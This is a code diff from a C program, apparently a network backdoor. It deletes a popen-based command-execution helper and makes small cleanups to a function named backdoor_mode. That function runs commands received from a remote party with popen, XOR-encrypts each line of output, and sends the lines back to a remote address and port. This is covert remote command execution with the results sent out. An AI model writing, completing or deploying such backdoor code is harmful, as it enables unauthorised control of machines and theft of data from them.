@@ -11,46 +11,6 @@
 #include "packet_handler.h"
 
 /*
- * Executes a command using popen and puts the results into result.
- *
- * NOTE: output must be freed
- *
- * Params:
- *      const char *command: The command to execute.
- *
- *      char **result: The pointer the the output buffer pointer.
- */
-char **execute_command(const char *command, int *size)
-{
-    FILE *fp;
-    const int MAX_LINE_LEN = 1024;
-    char line_buffer[MAX_LINE_LEN];
-    char **temp = NULL;
-    char **result = NULL;
-
-    fp = popen(command, "r");
-
-    // grab all the lines and realloc and concat string as needed
-    int i = 1;
-    while (fgets(line_buffer, MAX_LINE_LEN, fp))
-    {
-        temp = realloc(result, i * sizeof(char *));
-        if (!temp)
-        {
-            perror("realloc");
-            return NULL;
-        }
-        result = temp;
-        result[i - 1] = malloc(strlen(line_buffer) + 1);
-        strcpy(result[i - 1], line_buffer);
-        i++;
-    }
-    *size = i - 1;
-    pclose(fp);
-    return result;
-}
-
-/*
  * Callback function for examining captured packets.
  *
  * Params:
@@ -170,16 +130,18 @@ void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const st
     // Step 5: Execute the command
     fp = popen(command, "r");
 
-    // grab all the lines and realloc and concat string as needed
     memset(line_buffer, 0, MAX_LINE_LEN);
     memset(encrypted, 0, MAX_LINE_LEN);
+
     while (fgets(line_buffer, MAX_LINE_LEN, fp))
     {
         xor_bytes(XOR_KEY, strlen(XOR_KEY), line_buffer, encrypted, strlen(line_buffer));
         send_message_to_ip(this_ip, address, SERVER_PORT, encrypted, strlen(line_buffer));
+
         memset(line_buffer, 0, MAX_LINE_LEN);
         memset(encrypted, 0, MAX_LINE_LEN);
     }
+
     pclose(fp);
 }
 
